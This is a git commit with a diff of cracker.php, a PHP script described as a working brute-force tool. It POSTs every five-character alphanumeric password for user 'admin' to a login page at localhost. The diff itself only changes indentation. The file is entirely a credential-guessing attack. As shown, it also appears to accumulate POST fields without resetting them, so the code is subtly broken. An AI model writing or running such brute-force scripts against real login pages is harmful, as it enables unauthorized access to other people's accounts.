49bea3ed8254084daaa24146b22becd5632b646d
Venkatraman Srikanth <venkatramansrikanth@outlook.com>
2016-06-12 17:59:04 +0530

    Brute force working, still a bit slow. Have not add the database modification function yet

--- cracker.php
+++ cracker.php
@@ -1,22 +1,22 @@
 <?php
 	$curl_connection = curl_init('http://localhost/login.php');
 	curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
-    curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
-    $post_data['username'] = 'admin';
-    $post_data['submit'] = 'Submit';
-    $alphas = array_merge(range('A', 'Z'), range('a', 'z'), range('0','9'));
-    $size = count($alphas);
-    foreach ($alphas as $i) {
-    	foreach ($alphas as $j) {
-    		foreach ($alphas as $k) {
-    			foreach ($alphas as $l) {
-    				foreach ($alphas as $m) {
-    					$test_pass =  $i . $j . $k . $l . $m;
-    					$post_data['password'] = $test_pass;
+	curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
+	$post_data['username'] = 'admin';
+	$post_data['submit'] = 'Submit';
+	$alphas = array_merge(range('A', 'Z'), range('a', 'z'), range('0','9'));
+	$size = count($alphas);
+	foreach ($alphas as $i) {
+		foreach ($alphas as $j) {
+			foreach ($alphas as $k) {
+				foreach ($alphas as $l) {
+					foreach ($alphas as $m) {
+						$test_pass =  $i . $j . $k . $l . $m;
+						$post_data['password'] = $test_pass;
 						foreach ( $post_data as $key => $value) {
-					    	$post_items[] = $key . '=' . $value;
+							$post_items[] = $key . '=' . $value;
 						}
 						$post_string = implode ('&', $post_items);
 						//print $post_string;	
@@ -32,9 +32,9 @@
 						} else {
 							print "Failed \n";
 						}					
-    				}
-    			}
-    		}
-    	}
-    }	
+					}
+				}
+			}
+		}
+	}	
 ?>
